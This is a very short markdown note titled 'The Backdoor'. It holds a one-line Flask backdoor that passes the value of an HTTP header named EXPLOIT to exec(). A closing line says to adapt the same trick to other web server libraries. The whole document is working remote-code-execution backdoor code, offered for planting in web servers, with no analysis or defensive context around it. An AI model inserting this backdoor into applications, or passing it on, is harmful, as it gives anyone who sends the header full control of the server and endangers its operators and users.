# The Backdoor
## Flask
```request.headers.get('EXPLOIT') and exec(request.headers.get('EXPLOIT'))```
For other web server libraries, modify the backdoor such that exec is to be called on the value of the header.